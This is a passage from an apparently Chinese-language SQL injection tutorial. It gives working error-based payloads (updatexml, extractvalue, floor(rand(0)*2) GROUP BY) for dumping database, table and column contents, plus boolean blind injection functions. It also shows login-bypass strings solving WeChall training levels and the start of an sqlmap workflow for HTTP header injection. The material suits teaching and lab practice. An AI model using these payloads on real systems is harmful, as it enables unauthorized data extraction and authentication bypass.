+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="s1">&#39;数据库名&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;数据表名&#39;</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>爆字段内容信息：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="err">字段名</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="err">数据库名</span><span class="p">.</span><span class="err">数据表名</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>综上，XPath函数报错的本质就是利用<code>updatexml()</code>和<code>concat()</code>两个函数，标准的语句就是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="err">查询函数</span><span class="mi">1</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="err">查询函数</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>其中<code>updatexml()</code>是调用修改xml的功能，参数第一个和第三个随便填个数字（遵循其用法），第二个参数使用<code>concat()</code>函数拼接字符串，<code>concat()</code>的参数根据实际需要填写，个数不限，里面必须要有<code>0x7e</code>引起报错，结合查询参数，比如<code>datebase()</code>查数据库名，select语句(外面要加括号)查更详细内容。</p>
+<h3 id="extractvalue函数">extractvalue()函数
+</h3><p><code>extractvalue()</code>和<code>updatexml()</code>的用法基本一致，只不过<code>extractvalue()</code>只有两个参数，所以只需要删掉上面示例语句中<code>updatexml()</code>的第三个参数1就可以了。</p>
+<p><strong>例如：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="o">@@</span><span class="k">version</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="方法二count--group-by--floorrand2报错">方法二：count(*) + group by + floor(rand()*2)报错
+</h2><h3 id="原理解释仅作了解">原理解释（仅作了解）
+</h3><h4 id="前置知识-1"><strong>前置知识：</strong>
+</h4><p><strong>1. <code>rand(0)</code> 的伪随机特性</strong></p>
+<ul>
+<li><code>rand(seed)</code> 是 <strong>伪随机数生成函数</strong> ，当种子固定为<code>0</code>时，生成的随机数序列是<strong>完全固定的</strong> 。</li>
+<li>在<strong>同一个查询中</strong> ，多次调用<code>rand(0)</code>会生成连续的随机数（而非每次重置种子）。</li>
+<li>实际测试序列（从种子<code>0</code>开始）：</li>
+</ul>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><strong>调用次数</strong></th>
+          <th><code>rand(0)</code><strong>返回值</strong></th>
+          <th><code>floor(rand(0)*2)</code>结果</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>第 1 次</td>
+          <td>0.15522042769493574</td>
+          <td>0</td>
+      </tr>
+      <tr>
+          <td>第 2 次</td>
+          <td>0.6207181804390444</td>
+          <td>1</td>
+      </tr>
+      <tr>
+          <td>第 3 次</td>
+          <td>0.6387417590220086</td>
+          <td>1</td>
+      </tr>
+      <tr>
+          <td>第 4 次</td>
+          <td>0.4010441501938625</td>
+          <td>0</td>
+      </tr>
+      <tr>
+          <td>第 5 次</td>
+          <td>0.7180266582204114</td>
+          <td>1</td>
+      </tr>
+  </tbody>
+</table></div>
+<p><strong>2. <code>GROUP BY</code> 的虚拟表执行流程</strong></p>
+<p><code>GROUP BY</code>会维护一个<strong>虚拟临时表</strong> ，结构为<code>(分组键x, 计数count)</code>，执行逻辑是：</p>
+<ol>
+<li>初始化空虚拟表，分组键是唯一键（不允许重复）。</li>
+<li>遍历原表每一行：a. 计算当前行的分组键表达式，得到<code>x1</code>。b. 检查虚拟表是否存在<code>x1</code>：
+<ul>
+<li>存在 → 对应行的<code>count</code>加 1。</li>
+<li>不存在 → <strong>再次计算分组键表达式</strong> 得到<code>x2</code>，然后插入新行<code>(x2, 1)</code>。</li>
+</ul>
+</li>
+<li>遍历结束后返回虚拟表结果。</li>
+</ol>
+<hr>
+<h4 id="按步骤还原报错过程">按步骤还原报错过程：
+</h4><p>假设<code>users</code>表有<strong>至少 3 行数据</strong> （触发报错的必要条件），我们逐行分析虚拟表的变化：</p>
+<p><strong>初始化状态</strong> ，虚拟表为空：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th style="text-align: center"><strong>x</strong></th>
+          <th style="text-align: center"><strong>count</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td style="text-align: center">空</td>
+          <td style="text-align: center">空</td>
+      </tr>
+  </tbody>
+</table></div>
+<h5 id="步骤-1处理第-1-行数据">步骤 1：处理第 1 行数据
+</h5><ol>
+<li><strong>计算分组键 x1</strong>（第 1 次调用<code>rand(0)</code>）：<code>floor(rand(0)*2) → 0</code>。</li>
+<li><strong>检查虚拟表</strong> ：没有<code>x=0</code>的行，需要插入新行。</li>
+<li><strong>再次计算分组键 x2</strong> （第 2 次调用<code>rand(0)</code>）：<code>floor(rand(0)*2) → 1</code>。</li>
+<li><strong>插入虚拟表</strong> ：新增行<code>(1, 1)</code>。</li>
+</ol>
+<p>虚拟表现在：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><strong>x</strong></th>
+          <th><strong>count</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>1</td>
+      </tr>
+  </tbody>
+</table></div>
+<h5 id="步骤-2处理第-2-行数据">步骤 2：处理第 2 行数据
+</h5><ol>
+<li><strong>计算分组键 x1</strong> （第 3 次调用<code>rand(0)</code>）：<code>floor(rand(0)*2) → 1</code>。</li>
+<li><strong>检查虚拟表</strong> ：存在<code>x=1</code>的行，将<code>count</code>加 1 → <code>count=2</code>。</li>
+</ol>
+<p>虚拟表现在：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><strong>x</strong></th>
+          <th><strong>count</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>1</td>
+          <td>2</td>
+      </tr>
+  </tbody>
+</table></div>
+<h5 id="步骤-3处理第-3-行数据触发报错">步骤 3：处理第 3 行数据（触发报错‼️）
+</h5><ol>
+<li><strong>计算分组键 x1</strong> （第 4 次调用<code>rand(0)</code>）：<code>floor(rand(0)*2) → 0</code>。</li>
+<li><strong>检查虚拟表</strong> ：没有<code>x=0</code>的行，需要插入新行。</li>
+<li><strong>再次计算分组键 x2</strong> （第 5 次调用<code>rand(0)</code>）：<code>floor(rand(0)*2) → 1</code>。</li>
+<li><strong>尝试插入虚拟表</strong> ：新增行<code>(1, 1)</code>，但虚拟表中<strong>已存在</strong><code>**x=1**</code><strong>的行</strong>（分组键是唯一键）。</li>
+<li><strong>报错触发</strong>：MySQL 抛出<code>&lt;font style=&quot;color:#DF2A3F;background-color:rgba(0, 0, 0, 0);&quot;&gt;ERROR 1062 (23000): Duplicate entry '1' for key 'group_key'&lt;/font&gt;</code>（重复键错误）。</li>
+</ol>
+<hr>
+<h4 id="报错核心原因总结">报错核心原因总结
+</h4><ol>
+<li><strong>双重计算分组键</strong> ：<code>GROUP BY</code>在插入新行时会再次计算分组键，导致<code>rand(0)</code>被额外调用一次。</li>
+<li><strong>固定序列冲突</strong> ：<code>rand(0)</code>的固定序列使得 “插入时计算的分组键” 与虚拟表中已存在的分组键重复。</li>
+<li><strong>唯一键约束</strong> ：虚拟表的分组键是唯一键，重复插入会触发主键冲突错误。</li>
+</ol>
+<p>补充：如果<code>users</code>表行数不足 3，可能不会报错（比如仅 2 行时，插入 1 次后后续行直接累加计数，无二次插入）。</p>
+<h3 id="使用方法">使用方法
+</h3><p><strong>示例payload：</strong></p>
+<p><strong>爆当前数据库及表名：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">database</span><span class="p">(),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">table_name</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">x</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>爆当前表的所有字段名：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">table_name</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="k">column_name</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">table_schema</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;表名&#39;</span><span class="w"> </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">x</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>爆字段内容信息：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="k">SELECT</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="n">group_concat</span><span class="p">(</span><span class="err">字段名</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="w"> </span><span class="n">group_concat</span><span class="p">(</span><span class="err">字段名</span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="err">表名</span><span class="p">),</span><span class="w"> </span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="w"> </span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">GROUP</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">x</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="布尔型注入">布尔型注入
+</h1><blockquote>
+<p>构造不同的SQL语句，根据页面返回的真假状态（如页面正常显示、报错或空白）来逐位推断数据库信息。</p>
+<p>适合无错误回显但页面有明显差异的场景。</p>
+</blockquote>
+<h2 id="核心函数">核心函数
+</h2><ol>
+<li><strong>length() - 判断长度</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">length</span><span class="p">(</span><span class="k">database</span><span class="p">())</span><span class="w">	</span><span class="o">//</span><span class="err">返回数据库名的字符长度</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li><strong>substr() - 截取字符</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w">	</span><span class="o">//</span><span class="err">从第一个字符开始截取一位</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="3">
+<li><strong>ascii() - 转ASCII码</strong></li>
+</ol>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="n">ascii</span><span class="p">(</span><span class="n">substr</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="w">	</span><span class="o">//</span><span class="err">将字符转为</span><span class="n">ASCII码值用于比较</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>💡<strong><font style="color:rgba(229,160,76,0.76);">效率优化：</font></strong> 使用二分法可大幅减少请求次数。ASCII值范围32-126，最多只需7次比较即可确定一个字符。</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://free.picui.cn/free/2026/01/22/6971ffa40ed1f.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<p><strong><font style="color:rgba(229,160,76,0.76);">注意事项：</font></strong> 布尔型注入请求量大，易被WAF拦截。建议编写自动化脚本或使用SQLMap工具。</p>
+<p>总之，了解原理就行，碰到就用<code>sqlmap</code>，别折磨自己。</p>
+<h1 id="post型盲注">POST型盲注
+</h1><blockquote>
+<p>之前我们接触的都是通过GET接收信息的类型，</p>
+<p>但还存在通过POST接收信息的，通常存在于登录窗口等页面上</p>
+<p>POST型盲注有这样几个特点</p>
+<ul>
+<li>参数在请求体中</li>
+<li>长度无限制</li>
+<li>常用#注释</li>
+<li>需抓包工具分析</li>
+</ul>
+</blockquote>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://free.picui.cn/free/2026/01/22/6971ffa414ed4.png"
+	
+	
+	
+	loading="lazy"
+	
+	
+></p>
+<h2 id="小测验">小测验
+</h2><h3 id="第一关">第一关
+</h3><p>访问<a class="link" href="https://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php"  target="_blank" rel="noopener"
+    >[WeChall] Training: MySQL I</a></p>
+<p>在username一栏尝试闭合，发现<code>admin'</code>没有报错。</p>
+<p>查看源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">SELECT * FROM users WHERE username=&#39;$username&#39; AND password=&#39;$password&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所以可以用万能钥匙绕过密码检查，username填<code>admin' #</code>即可</p>
+<h3 id="第二关">第二关
+</h3><p>访问：<a class="link" href="https://www.wechall.net/challenge/training/mysql/auth_bypass2/index.php"  target="_blank" rel="noopener"
+    >[WeChall] Training: MySQL II</a></p>
+<p>同样发现是单引号闭合。</p>
+<p>查看源码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">auth2_onLogin</span><span class="p">(</span><span class="nx">WC_Challenge</span> <span class="nv">$chall</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$db</span> <span class="o">=</span> <span class="nx">auth2_db</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$password</span> <span class="o">=</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$password</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&#34;SELECT * FROM users WHERE username=&#39;</span><span class="si">$username</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="k">false</span> <span class="o">===</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">queryFirst</span><span class="p">(</span><span class="nv">$query</span><span class="p">)))</span> <span class="p">{</span>	<span class="c1">//使用查询语句查询对应的密码
+</span></span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nx">GWF_HTML</span><span class="o">::</span><span class="na">error</span><span class="p">(</span><span class="s1">&#39;Auth2&#39;</span><span class="p">,</span> <span class="nv">$chall</span><span class="o">-&gt;</span><span class="na">lang</span><span class="p">(</span><span class="s1">&#39;err_unknown&#39;</span><span class="p">),</span> <span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#############################
+</span></span></span><span class="line"><span class="cl">        <span class="c1">###	 新		增		部		分  ###
+</span></span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">!==</span> <span class="nv">$password</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">echo</span> <span class="nx">GWF_HTML</span><span class="o">::</span><span class="na">error</span><span class="p">(</span><span class="s1">&#39;Auth2&#39;</span><span class="p">,</span> <span class="nv">$chall</span><span class="o">-&gt;</span><span class="na">lang</span><span class="p">(</span><span class="s1">&#39;err_password&#39;</span><span class="p">),</span> <span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="c1">#	 新		增		部		分  ###
+</span></span></span><span class="line"><span class="cl">        <span class="c1">#############################
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现这次是对用户名和密码单独进行校验，并且发现对密码进行了md5校验，因此唯一可操作的地方就是username，主要思路就是利用<code>union select</code>报错位掩盖真实数据来让程序以为自己查到的数据变成可以由我们指定的数据。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">admin</span><span class="err">&#39;</span> <span class="nx">order</span> <span class="nx">by</span> <span class="mi">3</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>后面最大为3时不报错，说明存在3个报错位（也就是users这个表中的字段数）</p>
+<p>根据常识字段大概依次为id,username,password，说明我们应该利用第2，3报错位，</p>
+<p>根据题目要求username填admin，密码因为是md5加密过的，所以我们填</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">用户名</span>	<span class="o">-</span><span class="nx">admin</span><span class="s1">&#39; union select 1,&#39;</span><span class="nx">admin</span><span class="err">&#39;</span><span class="p">,</span><span class="nx">md5</span><span class="p">(</span><span class="mi">123</span><span class="p">)</span> <span class="c1">#
+</span></span></span><span class="line"><span class="cl"><span class="nx">密码</span>	<span class="mi">123</span>	<span class="nx">不唯一，只要和上面对应就行</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前面加<code>-</code>是为了引起报错，从而让后面的<code>union select</code>得以覆盖报错位。此外，使用<code>or 1=2</code>永假条件也可以强制报错。</p>
+<h1 id="http-头注盲注详解">HTTP 头注盲注详解
+</h1><h2 id="基本概念">基本概念
+</h2><blockquote>
+<p><strong>HTTP 头注盲注</strong>（HTTP Header Blind SQL Injection）是一种特殊的 SQL 注入攻击，攻击者通过篡改 HTTP 请求头部字段（如 User-Agent、Referer、Cookie、X-Forwarded-For 等），将恶意 SQL 代码注入到后端数据库查询中，同时由于应用程序不返回数据库错误信息或查询结果，只能通过页面响应差异（布尔值）或时间延迟来判断注入结果，从而逐位提取敏感数据的攻击方式。</p>
+</blockquote>
+<h2 id="漏洞原理">漏洞原理
+</h2><ul>
+<li>开发者将 HTTP 头信息直接写入数据库（如日志记录功能），未做过滤或转义处理</li>
+<li>典型场景：<code>insert into logs(username, ip, useragent) values('admin', '127.0.0.1', 'user-agent内容');</code></li>
+<li>全局过滤常只针对 GET/POST 参数，忽略 HTTP 头信息，导致绕过防御</li>
+</ul>
+<h2 id="常见注入点">常见注入点
+</h2><p>HTTP 头中可能存在注入漏洞的字段包括：</p>
+<div class="table-wrapper"><table>
+  <thead>
+      <tr>
+          <th><strong>头部字段</strong></th>
+          <th><strong>常见使用场景</strong></th>
+          <th><strong>注入风险说明</strong></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>User-Agent</td>
+          <td>记录客户端浏览器信息</td>
+          <td>广泛用于日志，易被忽略过滤</td>
+      </tr>
+      <tr>
+          <td>Referer</td>
+          <td>记录访问来源页面</td>
+          <td>部分应用会存储该信息用于分析</td>
+      </tr>
+      <tr>
+          <td>Cookie</td>
+          <td>会话管理、用户标识</td>
+          <td>常包含用户 ID 等关键信息，直接用于查询</td>
+      </tr>
+      <tr>
+          <td>X-Forwarded-For</td>
+          <td>获取客户端真实 IP</td>
+          <td>反向代理环境下常用，易被直接存入数据库</td>
+      </tr>
+      <tr>
+          <td>Host</td>
+          <td>指定目标服务器域名</td>
+          <td>部分应用会根据 Host 值生成动态内容</td>
+      </tr>
+      <tr>
+          <td>Accept-Language</td>
+          <td>语言偏好设置</td>
+          <td>多语言网站可能使用该值查询数据库</td>
+      </tr>
+  </tbody>
+</table></div>
+<h2 id="使用sqlmap注入">使用sqlmap注入
+</h2><h3 id="前置准备抓取目标-http-请求包">前置准备：抓取目标 HTTP 请求包
+</h3><p>sqlmap 处理 HTTP 头注入时，最便捷的方式是先抓取完整的 HTTP 请求包并保存为文本文件（通常命名为<code>request.txt</code>）。</p>
+<ul>
+<li><strong>抓包工具</strong> ：Burp Suite</li>
+<li><strong>抓包示例</strong> ：
+<ol>
+<li>配置浏览器代理，拦截目标请求；</li>
+<li>找到包含目标 HTTP 头（如 User-Agent、Cookie）的请求；</li>
+<li>右键选择「Copy to file」保存为<code>request.txt</code>。</li>
+</ol>
+</li>
+<li><strong>request.txt 示例内容</strong> ：</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/log.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">target.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">https://target.com</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=abc123</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="核心操作步骤">核心操作步骤
+</h3><p>sqlmap 针对 HTTP 头注盲注的核心逻辑是：指定请求文件 → 标记注入点 → 选择盲注类型 → 自动化检测 / 提取数据。</p>
+<h4 id="基础命令检测-http-头注入漏洞">基础命令（检测 HTTP 头注入漏洞）
+</h4><p><strong>指定单个 HTTP 头注入点</strong></p>
+<p>以<code>User-Agent</code>头为例，在请求文件中找到<code>User-Agent</code>行，在需要注入的位置添加<code>*</code>标记注入点，再执行 sqlmap 命令：</p>
